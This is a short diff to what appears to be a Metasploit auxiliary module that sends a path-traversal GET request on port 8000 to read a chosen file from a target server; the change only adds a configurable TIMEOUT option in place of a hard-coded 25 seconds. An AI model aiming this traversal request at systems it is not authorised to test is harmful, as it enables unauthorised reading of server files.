@@ -38,10 +38,15 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8000),
-        OptString.new("FILEPATH", [false, 'Specify a parameter for the action'])
+        OptString.new("FILEPATH", [ false, 'Specify a parameter for the action' ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
 
     deregister_options('RHOST')
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -58,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
     res = send_request_raw({
       'method' => 'GET',
       'uri'    => "/#{traversal}\\#{datastore['FILEPATH']}"
-    }, 25)
+    }, timeout)
 
     print_status("Server returns HTTP code: #{res.code.to_s}")
 
